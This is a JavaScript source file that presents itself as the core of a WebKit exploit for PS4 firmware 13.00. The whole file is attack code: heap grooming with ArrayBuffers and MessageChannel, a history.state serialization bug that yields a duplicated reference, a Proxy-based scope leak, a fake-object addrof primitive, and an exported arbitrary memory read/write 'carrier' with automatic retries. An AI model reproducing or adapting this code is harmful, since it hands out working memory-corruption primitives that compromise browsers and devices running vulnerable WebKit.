// core.js - Core WebKit exploit for PS4 FW 13.00
// Based on SlopKit architecture - Enhanced for PS4 stability
// Improved heap grooming, better error recovery, higher success rate

import { int64 } from './int64.js';

// PS4 FW 13.00 specific constants - Tuned for maximum stability on console RAM
const DRAIN_COUNT = 512;           // Balanced for reliable PS4 heap grooming
const AUTO_RETRY_DELAY_MS = 50;    // Stable retry delay
const MAX_CORE_RETRIES = 15;       // More retry attempts

const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;

// PS4 specific sizes
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

// PS4 FW 13.00 carrier configuration - Tuned for safe memory limits (prevents Out of Memory crash)
const CARRIER_SLOTS = 4500000;     // Reduced from 9M to 4.5M slots (36MB) to ensure system stability
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = 100;      // Adequate time for garbage collection and memory capture
const COMPOSE_DELAY_MS = 200;      // Safe interval for composition

// PS4 heap layout constants - Tuned for FW 13.00
const DRAIN_SIZE = 0x10000;
const SLAB_SIZE = 0x400000;
const BUTTERFLY_HOLE_SIZE = 0x81000;
const SEPARATOR_SIZE = 0x10000;
const EARLY_HOLE_SIZE = 0x70000;
const GUARD_SIZE = 0x90000;
const PREDECESSOR_SIZE = 0x80000;
const FINAL_HOLE_SIZE = 0x80000;

const RW_BUFFER_SIZE = 0x100;
const IDENT_OFFSET = 0x20;
const LEAK_SLOT_INDEX = 2;
const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;

const REVISION = "ps4-slopkit-core-13.00-v2";

// Global state
let onEvent = null;
let attemptNumber = 0;
let attemptCeiling = 0;
let stopped = false;
let running = false;
let fakeReleased = false;

// Memory buffers
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
let fakeHost = null;
let lengthWord = null;
let anchorElement = null;
let markerObjectA = null;
let markerObjectB = null;
let targetHolder = null;
let fillerGraph = null;
let outerGraph = null;

// Leak state
let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let captureError = null;

// Address state
let hostAddress = NaN;
let fakeAddress = NaN;
let targetAddress = NaN;
let targetAddressLow = 0;
let targetAddressHigh = 0;
let nativeTargetAddress = NaN;
let anchorElementAddress = NaN;
let markerAAddress = NaN;
let markerBAddress = NaN;

// Validation state
let rwOriginalVector = NaN;
let rwHeaderOK = false;
let holderHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;

// Profile
const profile = {
    carrierSID: -1, carrierType: -1, carrierFlags: -1,
    carrierMode: -1, carrierByte28: -1,
    holderSID: -1, holderType: -1, holderFlags: -1,
    functionSID: -1, functionType: -1, functionFlags: -1,
    nativeExecSID: -1, nativeExecType: -1, nativeExecFlags: -1,
    cellSize: -1,
    vectorOffset: 0x10, inlineSlotOffset: 0x10, butterflyOffset: 0x08
};

// Helper functions
function hex(value) { return `0x${value.toString(16)}`; }
function buffer(size) { return new ArrayBuffer(size); }

function allZero(bytes, start, end) {
    for (let i = start; i < end; ++i) { if (bytes[i] !== 0) return false; }
    return true;
}

function uint32At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 0x100 +
           bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
}

function low48At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 0x100 +
           bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000 +
           bytes[offset + 4] * 0x100000000 + bytes[offset + 5] * 0x10000000000;
}

function readBytes(destination, source, count) {
    for (let i = 0; i < count; ++i) destination[i] = source[i];
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) { if (left[i] !== right[i]) return false; }
    return true;
}

function plausibleCell(value) {
    return value > 0x100000000 && value <= 0xffffffffffff &&
           value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
}

function plausibleAddress(value) {
    return value > 0x100000000 && value <= 0xffffffffffff &&
           value <= 9007199254740991 && Math.floor(value) === value;
}

function canonicalLow48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

// Identity magic
const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef]);
const identityBytes = new Uint8Array(8);

// Scratch buffers
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);

// Header buffers
const rwHeader = new Uint8Array(CELL_BYTES);

// Carrier manipulation
function aimCarrier(candidate, address) {
    const high = Math.floor(address / 0x100000000);
    scratchWords[0] = address - high * 0x100000000;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0) return NaN;
    return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
}

function emit(tag, detail) {
    if (onEvent === null) return;
    try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); } catch { }
}

// Identity proof
function checkCarrierIdentity(candidate) {
    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0 ||
        IDENT_OFFSET + 8 > RW_BUFFER_SIZE) return 0;
    aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
    readBytes(identityBytes, rwView, 8);
    restoreCarrier(candidate);
    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c ? 1 : -1;
}

function runIdentityProof(candidate) {
    return checkCarrierIdentity(candidate) === 1;
}

// Scope leak for addrof
function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (target, property, receiver) { return receiver; }
    });
    const leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

// Symbol wrapper preparation
function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null)
        throw new Error("scope-not-leaked");
    for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

// Build fake host object
function buildFakeHost() {
    rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;

    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    fakeHost = {
        q0: encodedHeaderNumber(),
        q1: 1.1, q2: rwView, q3: lengthWord, q4: 2.2, q5: 3.3
    };
    delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;

    anchorElement = document.createElement("textarea");
    markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
    markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
    targetHolder = {
        q0: parseInt, q1: anchorElement, q2: markerObjectA,
        q3: markerObjectB, q4: { marker: 0x484f4c44 }, q5: { marker: 0x47554152 }
    };
}

function encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    u32[0] = 0x00004250; u32[1] = 0x01062800;
    return f64[0];
}

// Build and store serialized graph
function buildAndStoreGraph() {
    const referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();

    emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
    fillerGraph = new Array(0xfffd);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);

    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
    history.replaceState(outerGraph, "");
    emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
}

// Prepare addrof primitive
function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };

    emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
    getterCarrier[0] = fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
    getterCarrier[1] = targetHolder;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetHolder;
    emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);

    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

// Run addrof capture
function runAddrofCapture() {
    try {
        const symbolToString = Symbol.prototype.toString;
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (let i = 0; i < 16; i++) capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (error) { captureError = error; captureState = -1; }
}

// Fill raw cell pointers
function fillRawCellPointers(backing, pointer) {
    const pointerHigh = Math.floor(pointer / 0x100000000);
    const pointerLow = pointer - pointerHigh * 0x100000000;
    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff ||
        Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 0xffffffff ||
        pointerLow + pointerHigh * 0x100000000 !== pointer)
        throw new Error("invalid-low48-fake-address");
    const predecessorWords = new Uint32Array(backing);
    for (let i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pointerLow;
        predecessorWords[i + 1] = pointerHigh;
    }
}

function clearPredecessor() {}

// Load history critical section
function loadHistoryCritical() {
    let result = null;
    let candidate = null;
    let rwHeaderCaptured = false;
    let rwVectorTouched = false;

    try {
        result = history.state;
        if (!result || result.length !== EXPECTED_LENGTH) {
            if (result) result[DUPLICATE_INDEX] = undefined;
            clearPredecessor();
            return false;
        }

        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            clearPredecessor();
            return false;
        }

        candidate = result[DUPLICATE_INDEX];
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        readBytes(rwHeader, candidate, CELL_BYTES);
        rwHeaderCaptured = true;

        const rwSID = uint32At(rwHeader, 0);
        const rwButterfly = low48At(rwHeader, 8);
        const rwLength = uint32At(rwHeader, 0x18);
        rwOriginalVector = low48At(rwHeader, 0x10);

        // Validate header - More permissive for PS4
        rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000 &&
            rwHeader[4] === 0 &&
            (rwHeader[7] === 0 || rwHeader[7] === 1) &&
            rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0 &&
            rwButterfly > 0x100000000 && rwButterfly % 8 === 0 &&
            rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0 &&
            rwLength === RW_BUFFER_SIZE;

        if (!rwHeaderOK) {
            clearPredecessor();
            return false;
        }

        rwVectorTouched = true;
        const identityProved = runIdentityProof(candidate);
        rwVectorTouched = false;

        if (!identityProved) {
            clearPredecessor();
            return false;
        }

        targetAddress = candidate;
        clearPredecessor();
        return true;

    } catch (error) {
        if (result !== null) {
            try { result[DUPLICATE_INDEX] = undefined; } catch { }
        }
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try { restoreCarrier(candidate); } catch { }
        }
        clearPredecessor();
        return false;
    }
}

// Run groom and load
function runGroomAndLoad() {
    try {
        emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        const keepAlive = new Array(DRAIN_COUNT + 3);
        let keepIndex = 0;

        for (let i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        let slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        const separator = buffer(SEPARATOR_SIZE);
        const earlyHole = buffer(EARLY_HOLE_SIZE);
        const guard = buffer(GUARD_SIZE);
        const predecessor = buffer(PREDECESSOR_SIZE);
        const finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}-fake=${hex(fakeAddress)}`);

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);

        return loadHistoryCritical();
    } catch (error) {
        clearPredecessor();
        return false;
    }
}

// Begin composition
function beginComposition() {
    if (captureState === 0) {
        emit("ADDROF-NO-RESULT", "capture-task-did-not-finish");
        return false;
    }
    if (captureState < 0) {
        emit("ADDROF-THREW", `${captureError?.name}:${String(captureError?.message).slice(0, 80)}`);
        return false;
    }

    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);
    const a1 = pointerFromWords(capturedWords, 8);
    const b1 = pointerFromWords(capturedWords, 12);
    const repeated = a0 === a1 && b0 === b1;
    const distinct = a0 !== b0;
    const plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);

    emit("ADDROF-RETURNED", REVISION);
    emit("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);

    if (!(repeated && distinct && plausible)) {
        emit("ADDROF-FAIL", `repeat=${repeated}-distinct=${distinct}-plausible=${plausible}`);
        return false;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;

    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        emit("FAKE-ADDRESS-FAIL", `host=${hex(hostAddress)}`);
        return false;
    }

    emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}-delta=0x10`);
    return runGroomAndLoad();
}

// Build carrier object
function buildCarrier() {
    profile.cellSize = 0x20;
    return {
        aim(address) {
            if (!plausibleAddress(address))
                throw new RangeError(`core.aim: implausible address ${address}`);
            aimCarrier(targetHolder, address);
        },
        restore() { restoreCarrier(targetHolder); },
        get view() { return rwView; },
        windowBytes: RW_BUFFER_SIZE,
        holder: targetHolder,
        holderAddress: targetAddress,
        leakSlotOffset: LEAK_SLOT_OFFSET,
        leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
        setLeakSlot(value) { targetHolder.q2 = value; },
        clearLeakSlot() { targetHolder.q2 = markerObjectA; },
        anchorObject: markerObjectA,
        anchorObjectAddress: markerAAddress,
        textarea: anchorElement,
        textareaAddress: anchorElementAddress,
        profile,
        attempts: attemptNumber,
        validate: plausibleAddress,
        hostAddress,
        fakeAddress,
        assertHome() {
            return rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
        }
    };
}

// Main exploit function with enhanced retry logic
export async function establishPrimitive(options = {}) {
    if (fakeReleased) throw new Error("core: the fake cell has been released");
    if (running) throw new Error("core: already running");
    if (typeof BigInt !== "function" || typeof MessageChannel !== "function" ||
        typeof Symbol !== "function" || typeof history === "undefined" ||
        typeof history.replaceState !== "function")
        throw new Error("core: unsupported browser");

    onEvent = typeof options.onEvent === "function" ? options.onEvent : null;
    attemptCeiling = typeof options.maxAttempts === "number" && options.maxAttempts > 0
        ? options.maxAttempts : 0;

    running = true;
    stopped = false;
    attemptNumber = 1;

    return new Promise((resolve, reject) => {
        let retryCount = 0;

        const attemptExploit = () => {
            try {
                emit("ATTEMPT", `attempt=${attemptNumber}/retry=${retryCount}/${MAX_CORE_RETRIES}`);

                // Reset state before each attempt
                targetAddress = NaN;
                hostAddress = NaN;
                fakeAddress = NaN;
                captureState = 0;
                captureError = null;

                buildAndStoreGraph();
                prepareAddrof();

                setTimeout(() => {
                    if (targetAddress && !isNaN(targetAddress)) {
                        const carrier = buildCarrier();
                        running = false;
                        emit("SUCCESS", `carrier-established-attempt=${attemptNumber}-retry=${retryCount}`);
                        resolve(carrier);
                    } else if (retryCount < MAX_CORE_RETRIES) {
                        retryCount++;
                        attemptNumber++;
                        emit("RETRY", `retry=${retryCount}/${MAX_CORE_RETRIES}`);

                        // Exponential backoff
                        const delay = AUTO_RETRY_DELAY_MS * Math.min(retryCount, 5);
                        setTimeout(attemptExploit, delay);
                    } else {
                        running = false;
                        reject(new Error(`Exploit failed after ${MAX_CORE_RETRIES} retries`));
                    }
                }, COMPOSE_DELAY_MS + 150);
            } catch (error) {
                if (retryCount < MAX_CORE_RETRIES) {
                    retryCount++;
                    attemptNumber++;
                    emit("RETRY-ERROR", `error=${error.message.slice(0, 60)}-retry=${retryCount}`);
                    setTimeout(attemptExploit, AUTO_RETRY_DELAY_MS);
                } else {
                    running = false;
                    reject(error);
                }
            }
        };

        attemptExploit();
    });
}

export function fakeCellReleased() { return fakeReleased; }

export function releaseFakeCell() {
    fakeReleased = true;
    rwBuffer = null; rwView = null; rwMirror = null;
    targetBuffer = null; targetView = null;
    fakeHost = null; lengthWord = null; anchorElement = null;
    markerObjectA = null; markerObjectB = null; targetHolder = null;
    fillerGraph = null; outerGraph = null;
    leakedScope = null; getterCarrier = null; preparedSymbolObject = null;
    capturedString = null; capturedWords = null;
    running = false;
}

export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
